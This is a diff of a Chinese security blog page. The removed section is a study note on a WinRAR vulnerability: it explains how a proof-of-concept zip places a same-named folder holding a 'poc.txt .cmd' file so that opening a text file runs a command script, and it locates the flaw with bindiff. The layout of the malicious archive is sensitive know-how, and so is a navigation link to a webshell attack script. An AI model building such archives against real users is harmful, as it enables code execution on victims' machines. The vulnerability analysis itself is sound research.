-<h3 id="WinRAR逆向"><a href="#WinRAR逆向" class="headerlink" title="WinRAR逆向"></a>WinRAR逆向</h3><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/3036/#/">https://paper.seebug.org/3036/#/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/GoodFish-/p/17715977.html#/">https://www.cnblogs.com/GoodFish-/p/17715977.html#/</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458544969&amp;idx=1&amp;sn=473822d99738dc8c20cf0c7df866adea&amp;chksm=b18d5bc386fad2d597b3b73e9bbd6d243e83e0191527db7cf84f277ac8c455b590956d5da778&amp;scene=27#/</a></p>
-<h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><p><code>poc.zip</code>中包含<code>poc.txt</code>和同名的<code>poc.txt</code>文件夹，文件夹中包含一个cmd执行程序名为<code>poc.txt .cmd</code>，用<code>winrar</code>打开<code>poc.zip</code>中的<code>poc.txt</code>文本，<code>poc.txt</code>和<code>poc.txt .cmd</code>都会被释放到临时文件中，而最终打开的是<code>poc.txt .cmd</code>，临时文件目录：<code>C:\Users\Lenovo\AppData\Local\Temp\Rar$DIa30724.35820</code></p>
-<img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E6%94%BB%E5%87%BB%E6%95%88%E6%9E%9C.png" class>
-
-<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>用<code>010editor</code>打开<code>poc.zip</code>，需要关注<code>zip</code>结构体中的<code>deFileName</code>，在<code>zip</code>压缩包内，每个文件和文件夹都对应了一个<code>ZIPDIRENTRY</code>数据结构，该数据结构包含一个名为<code>deFileName</code>的成员，用于存储目标文件&#x2F;文件夹的名称</p>
-<img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/zip%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F.png" class>
-
-<p>用<code>bindiff</code>比较存在漏洞的版本和更新的版本之间的差异，确定漏洞点位置在&#96;&#96;sub_1400EF508&#96;</p>
-<img src="/2024/07/05/2024-shu-qi-xue-xi-ji-lu/bindiff%E7%BB%93%E6%9E%9C.png" class>
-
-<h2 id="7-13"><a href="#7-13" class="headerlink" title="#7.13"></a>#7.13</h2><p>今天主要做了一些杂事，写了队规做了宣传海报清理手机电脑内存准备去招新咯。晚上收拾了下行李箱准备明天去上海投奔表哥（</p>
-
                 
             </div>
             <hr/>
@@ -933,6 +716,10 @@ v5 <span class="token operator">=</span> <span class="token punctuation">(</span
                             
                                 <a href="/tags/pwn/">
                                     <span class="chip bg-color">pwn</span>
+                                </a>
+                            
+                                <a href="/tags/shellcode/">
+                                    <span class="chip bg-color">shellcode</span>
                                 </a>
                             
                         </div>
@@ -973,9 +760,64 @@ v5 <span class="token operator">=</span> <span class="token punctuation">(</span
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2024/07/14/2024-chun-qiu-bei-xia-ji-sai/2024-chun-qiu-bei-xia-ji-sai/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="2024春秋杯夏季赛">
+                        
+                        <span class="card-title">2024春秋杯夏季赛</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            2024春秋杯夏季赛Write Up
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/WP/" class="post-category">
+                                    WP
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                    <a href="/tags/shellcode/">
+                        <span class="chip bg-color">shellcode</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2024/07/11/windbg-ida-ni-xiang-fen-xi-ji-chu-yong-fa/">
                     <div class="card-image">
@@ -993,9 +835,9 @@ v5 <span class="token operator">=</span> <span class="token punctuation">(</span
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-07-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1017,59 +859,6 @@ v5 <span class="token operator">=</span> <span class="token punctuation">(</span
                     
                     <a href="/tags/windbg/">
                         <span class="chip bg-color">windbg</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2024/06/09/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/Steel%20Gray.jpg" class="responsive-img" alt="awd一句话木马批量攻击脚本">
-                        
-                        <span class="card-title">awd一句话木马批量攻击脚本</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            AWD中一句话木马批量攻击利用脚本
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-06-09
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web/" class="post-category">
-                                    web
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                    <a href="/tags/awd/">
-                        <span class="chip bg-color">awd</span>
                     </a>
                     
                 </div>
